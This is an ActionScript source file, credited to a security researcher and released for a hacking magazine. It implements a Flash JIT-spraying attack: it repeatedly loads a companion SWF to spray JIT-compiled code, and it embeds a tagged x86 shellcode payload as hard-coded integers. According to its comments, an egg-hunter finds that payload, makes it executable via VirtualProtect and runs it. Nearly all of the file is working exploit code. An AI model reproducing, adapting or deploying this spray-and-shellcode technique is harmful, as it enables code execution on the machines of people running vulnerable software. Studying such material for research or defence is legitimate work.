
/*
FrommETaSploit2JIT v 0.9b
by Alexey Sintsov [DSecRG]
http://dsecrg.com

Special release for XAKEP magazine (http://www.xakep.ru)
*/

// Sprayng JIT.swf
// 
// Spraing JIT egg-hunter shellcode
//
// Find shellcode from MetaSploit
// than find address of VirtualProtect, make mem exec and jump
//
//  By Alexey Sintsov
//	dookie@inbox.ru
//	a.sintsov@dsec.ru
//
//	DSecRG - Digital Security Research Group [dsecrg.com]
//
package
{
    
	import flash.display.*;
	import flash.net.*;
    import flash.text.TextField;
    import flash.text.TextFieldType;
	import flash.system.Security;
	import flash.utils.*;
	
    public class Loadzz1 extends MovieClip
    {
	
		var MyTextField1:TextField = createTextField(10, 40, 340, 20);
		var childRef:DisplayObject = null;
	
		var val:ByteArray = new ByteArray();
	
		var ic=0;
		var ldInt;
		
		private function createTextField(x:Number, y:Number, width:Number, height:Number):TextField {
            var result:TextField = new TextField();
            result.x = x;
            result.y = y;
            result.width = width;
            result.height = height;
            result.background = true;
            result.border = true;
            addChild(result);
            return result;
        }

	
		function pageLoadEx()
		{
						
		    var ldr = new Loader();
			var url = "jit_egg.swf";
			var urlReq = new URLRequest(url);
            ldr.load(urlReq);
			childRef = addChild(ldr); 
            
			
		}
		function pageLoad()
		{
		    
			for(var z=0;z<600;z++){pageLoadEx();}
			ic=ic+1;
			MyTextField1.text=ic+" - Efetuando JIT spray. Aguarde a etapa 4 ...";
			if(ic==4)
				{
					clearInterval(ldInt);
					MyTextField1.text=ic+" - O JIT spraying foi finalizado. Aguarde a execução do Egg Hunter...";
				}
		}
		function metaShell() {
		val.endian = Endian.LITTLE_ENDIAN;

		//TAG
		val.writeInt(0x07333531)
		val.writeInt(0x07333531)

		//PAYLOAD
		val.writeInt(0xd99bebd9);
		val.writeInt(0x31f42474);
		val.writeInt(0x3177b2d2);
		val.writeInt(0x718b64c9);
		val.writeInt(0x0c768b30);
		val.writeInt(0x8b1c768b);
		val.writeInt(0x7e8b0846);
		val.writeInt(0x38368b20);
		val.writeInt(0xf375184f);
		val.writeInt(0xffd10159);
		val.writeInt(0x6c8b60e1);
		val.writeInt(0x458b2424);
		val.writeInt(0x28548b3c);
		val.writeInt(0x8bea0178);
		val.writeInt(0x5a8b184a);
		val.writeInt(0xe3eb0120);
		val.writeInt(0x348b4934);
		val.writeInt(0x31ee018b);
		val.writeInt(0xfcc031ff);
		val.writeInt(0x74c084ac);
		val.writeInt(0x0dcfc107);
		val.writeInt(0xf4ebc701);
		val.writeInt(0x28247c3b);
		val.writeInt(0x5a8be175);
		val.writeInt(0x66eb0124);
		val.writeInt(0x8b4b0c8b);
		val.writeInt(0xeb011c5a);
		val.writeInt(0x018b048b);
		val.writeInt(0x244489e8);
		val.writeInt(0xb2c3611c);
		val.writeInt(0x89d42908);
		val.writeInt(0x68c289e5);
		val.writeInt(0xec0e4e8e);
		val.writeInt(0xff9fe852);
		val.writeInt(0x4589ffff);
		val.writeInt(0xd87ebb04);
		val.writeInt(0x1c8773e2);
		val.writeInt(0x8ee85224);
		val.writeInt(0x89ffffff);
		val.writeInt(0x6c680845);
		val.writeInt(0x6841206c);
		val.writeInt(0x642e3233);
		val.writeInt(0x65737568);
		val.writeInt(0x245c8872);
		val.writeInt(0x56e6890a);
		val.writeInt(0x890455ff);
		val.writeInt(0xa8bb50c2);
		val.writeInt(0x87bc4da2);
		val.writeInt(0xe852241c);
		val.writeInt(0xffffff61);
		val.writeInt(0x20587568);
		val.writeInt(0x79746820);
		val.writeInt(0x7468626d);
		val.writeInt(0x68737565);
		val.writeInt(0x616d2072);
		val.writeInt(0x70206f68);
		val.writeInt(0x726f686f);
		val.writeInt(0x45686461);
		val.writeInt(0x316c7078);
		val.writeInt(0x245c88db);
		val.writeInt(0x68e38919);
		val.writeInt(0x20582132);
		val.writeInt(0x30322068);
		val.writeInt(0x53426831);
		val.writeInt(0x64686765);
		val.writeInt(0x6853206f);
		val.writeInt(0x2031206f);
		val.writeInt(0x72756368);
		val.writeInt(0x694d6873);
		val.writeInt(0xc931696e);
		val.writeInt(0x1a244c88);
		val.writeInt(0xd231e189);
		val.writeInt(0x52515352);
		val.writeInt(0xc031d0ff);
		val.writeInt(0x0855ff50);


			}
 

		function Loadzz1()
		{
		    
           Security.allowDomain("*");
			MyTextField1.type = TextFieldType.DYNAMIC;
			
			
			metaShell();
			ldInt=setInterval(pageLoad,2000);
			    
		}
    }
}
